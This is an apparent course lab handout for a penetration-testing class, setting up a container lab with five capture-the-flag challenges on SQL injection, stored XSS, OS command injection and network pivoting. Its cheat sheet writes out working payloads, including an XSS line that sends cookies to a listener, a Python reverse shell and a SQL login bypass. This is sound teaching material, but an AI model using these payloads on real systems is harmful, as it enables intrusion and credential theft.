# Week 4 Lab: Web Application Exploitation - Part I

Welcome to **Week 4** of Penetration Testing and Ethical Hacking!

This week's project focuses on **the OWASP Top 10**: SQL injection, stored XSS,
and OS command injection - and on what happens *after* you find one of these
bugs. You will use a single web application flaw to get a foothold, then use
that foothold to reach a second, otherwise-unreachable target.

---

## 1. Environment Architecture

Your environment consists of **three** containers on **two** private bridge
networks:

```
                 week4_edge_net (172.30.0.0/24)
  [student] ───────────────────────────────── [webapp]
 172.30.0.5                                   172.30.0.10
                                                   │
                                                   │  (dual-homed)
                                                   │
                                       week4_internal_net (172.30.1.0/24)
                                                   │
                                              [internal-db]
                                               172.30.1.20
```

- **`student` (`172.30.0.5`)**: Your pentesting workstation, pre-loaded with
  `nmap`, `sqlmap`, `nikto`, `gobuster`, `ffuf`, `whatweb`, `hydra`, `curl`,
  `netcat`, a MySQL/MariaDB client, and standard Linux tooling (`file`, `jq`,
  `vim`, man pages, etc).
- **`webapp` (`172.30.0.10`)**: A vulnerable internal company portal. This is
  the **only** host reachable from `student`.
- **`internal-db` (`172.30.1.20`)**: A backend database. It is **only**
  reachable from `webapp` - `student` has no route to it at all. `webapp` is
  dual-homed (it sits on both networks), so once you have code execution on
  `webapp` you can pivot from there into `internal_net`.

This mirrors a very common real-world layout: an internet/DMZ-facing web
server that is allowed to talk to an internal database server that nothing
else can reach directly. **Your job is to compromise `webapp`, then use it as
a launchpad to reach `internal-db`.**

---

## 2. Quick Start Instructions

1. Navigate to the `week4` directory:
   ```bash
   cd projects/week4
   ```

2. Build and launch the container environment:
   ```bash
   podman-compose up -d --build
   # OR if using Docker:
   # docker-compose up -d --build
   ```

3. Access your pentesting workstation container:
   ```bash
   podman exec -it week4_student bash
   ```
   *(Inside the student container, the web app is directly reachable as
   `webapp` or `172.30.0.10`. `internal-db` is not reachable from here - you
   have to earn that.)*

---

## 3. Mission Objectives (5 Flags)

All flags use the standard CTF format: `flag{...}`

---

### 🚩 Flag 1 (Easy) — SQL Injection Authentication Bypass
- **Target:** `http://webapp/login`
- **Task:** The login form builds its SQL query by directly concatenating
  your username and password into the query string. Log in as `admin`
  without knowing the admin password, and view the flag on `/dashboard`.

---

### 🚩 Flag 2 (Easy) — Information Disclosure / Backup File
- **Target:** `http://webapp/`
- **Task:** Check `robots.txt` for a disallowed path. A stale backup file
  was left inside it. Read the file to get the flag - and a hint about
  where to look later.

---

### 🚩 Flag 3 (Medium) — Stored XSS & Session Cookie Theft
- **Target:** `http://webapp/comments`
- **Task:** The comments page renders your submitted text without escaping
  it. An administrator account reviews new comments periodically in a real
  browser. Inject JavaScript that exfiltrates the admin's cookies to a
  listener you control on your own student container, and recover the flag
  from the stolen cookie.
- **Hint:** Stand up a listener on the student container first (e.g.
  `python3 -m http.server 8000` or `nc -lvnp 8000`) - the admin's browser
  needs somewhere to send the data. `webapp` can reach `student` directly.
- **Note:** the application's real login session cookie is `HttpOnly` (JS
  can't read it) - but not every cookie the app sets is.

---

### 🚩 Flag 4 (Medium) — OS Command Injection
- **Target:** `http://webapp/ping`
- **Task:** The "network diagnostics" tool runs `ping` against whatever host
  you supply, without sanitizing it. Break out of the intended command to
  run your own commands on the `webapp` container.
- **Goal:** Read the flag file directly, **and** use this bug to get an
  interactive (reverse) shell on `webapp` - you'll need it for Flag 5.

---

### 🚩 Flag 5 (Hard) — Pivot to the Internal Network
- **Objective:** Use your foothold on `webapp` to reach `internal-db`, which
  `student` cannot reach on its own.
- **Chain Steps:**
  1. Get an interactive shell on `webapp` via the command injection in
     `/ping` (a reverse shell back to your student container works well).
  2. From inside `webapp`, explore the filesystem for leftover
     configuration. There is a stale config file with database credentials
     that used to be needed locally but now point at an internal service.
  3. Confirm `webapp` can reach a host on a second network that `student`
     cannot (`ip a`, `/etc/hosts`, or just try connecting).
  4. Use the leaked credentials and `webapp`'s own `mysql` client (already
     installed on the target - "living off the land") to connect to
     `internal-db` and read the `flags` table.

---

## 4. Useful Tools & Hints Cheat Sheet

| Task | Command Example |
| :--- | :--- |
| **SQLi login bypass** | `curl -X POST http://webapp/login --data-urlencode "username=admin' OR '1'='1'--" --data-urlencode "password=x"` |
| **Check robots.txt** | `curl http://webapp/robots.txt` |
| **Automated SQLi** | `sqlmap -u http://webapp/login --data "username=x&password=x" --dbs` |
| **Local exfil listener** | `python3 -m http.server 8000` (run inside `week4_student`) |
| **Stored XSS payload** | `<img src=x onerror="fetch('http://172.30.0.5:8000/steal?c='+document.cookie)">` |
| **Command injection test** | `curl -X POST http://webapp/ping --data-urlencode "host=127.0.0.1; id"` |
| **Reverse shell listener** | `nc -lvnp 4444` (run inside `week4_student`) |
| **Reverse shell payload** | `127.0.0.1; python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("172.30.0.5",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("bash")' &` |
| **Check network reach from webapp** | `ip a` / `cat /etc/resolv.conf` / `getent hosts internal-db` |
| **DB pivot** | `mysql -h internal-db -u svc_reports -p<password> internal -e "SELECT * FROM flags;"` |

---

## 5. Lab Clean Up

When you have finished the lab, exit the student container and bring down
the environment:
```bash
podman-compose down
# OR:
# docker-compose down
```
